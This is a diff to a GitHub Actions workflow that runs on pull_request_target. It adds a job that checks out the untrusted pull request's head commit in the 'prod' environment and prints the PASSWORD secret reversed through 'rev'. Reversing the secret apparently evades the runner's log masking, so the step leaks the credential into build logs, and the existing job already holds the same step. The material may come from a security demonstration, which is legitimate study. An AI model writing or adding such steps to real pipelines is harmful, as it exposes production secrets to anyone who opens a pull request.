@@ -3,6 +3,16 @@ on:
   pull_request_target:
     branches: [ main ]
 jobs:
+  build2:
+    runs-on: ubuntu-latest
+    environment: prod
+    steps:
+      - uses: actions/checkout@v2
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Log password
+        run: echo "${{ secrets.PASSWORD }}" | rev
+        
   build:
     runs-on: ubuntu-latest
     environment: prod
@@ -12,4 +22,5 @@ jobs:
           ref: ${{ github.event.pull_request.head.sha }}
       - name: Log password
         run: echo "${{ secrets.PASSWORD }}" | rev
+        
 
